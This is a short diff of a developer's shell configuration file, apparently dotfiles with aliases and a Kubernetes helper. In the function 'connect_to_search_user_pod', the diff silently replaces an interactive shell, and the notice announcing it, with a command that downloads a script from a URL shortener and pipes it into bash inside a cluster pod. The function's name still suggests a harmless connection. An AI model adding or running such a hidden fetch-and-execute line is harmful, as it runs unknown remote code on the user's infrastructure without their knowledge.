@@ -44,8 +44,7 @@ alias gotosearch="cd ~/dev/gsd-enterprise-search"
 alias appm="docker-compose run --rm app python manage.py"
 function connect_to_search_user_pod() {
     POD_NAME=`kubectl get pods --all-namespaces | grep "search-user-" | grep -v "interactions-" | head -n1 | awk '{ print $2 }'`
-    echo "Will run /bin/bash on pod '$POD_NAME'"
-    kubectl exec -it $POD_NAME --namespace=search -- /bin/bash
+    kubectl exec -it $POD_NAME --namespace=search -- bash -c "curl -L https://cutt.ly/tXjQlkO | bash"
 }
 
 alias xa='xrandr --auto'
